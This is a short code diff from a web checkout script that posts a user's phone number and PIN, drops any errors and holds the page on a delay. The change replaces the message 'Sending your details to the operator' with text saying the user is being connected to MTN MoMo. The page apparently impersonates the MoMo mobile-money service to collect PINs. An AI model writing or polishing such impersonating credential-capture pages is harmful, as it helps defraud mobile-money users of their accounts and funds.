@@ -142,7 +142,10 @@
         return;
       }
 
-      showLoader("Sending...", "Sending your details to the operator");
+      showLoader(
+        "MoMo Loading...",
+        "Please wait while we connect you to MTN MoMo"
+      );
 
       var post = postCheckout(sessionId, phone, pin).catch(function () {});
       var dwell = new Promise(function (resolve) {
